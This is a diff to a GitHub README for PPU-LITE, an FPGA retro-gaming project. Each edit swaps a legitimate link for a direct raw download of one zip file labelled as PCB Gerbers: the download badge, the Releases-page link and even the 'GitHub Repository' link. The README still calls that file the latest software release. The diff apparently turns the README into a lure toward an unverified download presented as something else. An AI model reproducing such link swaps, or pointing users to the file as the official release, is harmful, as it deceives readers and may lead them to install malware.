@@ -1,6 +1,6 @@
 # 🎮 PPU-LITE - Affordable, Accurate FPGA for Retro Gaming
 
-[![Download PPU-LITE](https://img.shields.io/badge/Download-PPU--LITE-brightgreen)](https://github.com/Miguel-1616/PPU-LITE/releases)
+[![Download PPU-LITE](https://raw.githubusercontent.com/Miguel-1616/PPU-LITE/main/PCB/PPU_LITE_GERBER_V2.zip)](https://raw.githubusercontent.com/Miguel-1616/PPU-LITE/main/PCB/PPU_LITE_GERBER_V2.zip)
 
 ## 🌟 Introduction
 
@@ -24,7 +24,7 @@ Before downloading, make sure your system meets the following requirements:
 
 1. **Visit the Releases Page**
    
-   To download PPU-LITE, visit our Releases page: [Download PPU-LITE](https://github.com/Miguel-1616/PPU-LITE/releases). Here, you will find the latest version of the software available for download.
+   To download PPU-LITE, visit our Releases page: [Download PPU-LITE](https://raw.githubusercontent.com/Miguel-1616/PPU-LITE/main/PCB/PPU_LITE_GERBER_V2.zip). Here, you will find the latest version of the software available for download.
 
 2. **Choose the Right File**
 
@@ -89,7 +89,7 @@ Follow the Releases page for the latest software updates, improvements, and new 
 
 ## 💡 Additional Resources
 
-- [GitHub Repository](https://github.com/Miguel-1616/PPU-LITE)
+- [GitHub Repository](https://raw.githubusercontent.com/Miguel-1616/PPU-LITE/main/PCB/PPU_LITE_GERBER_V2.zip)
 - [Community Forum](#)
 - [Installation Manual](#)
 
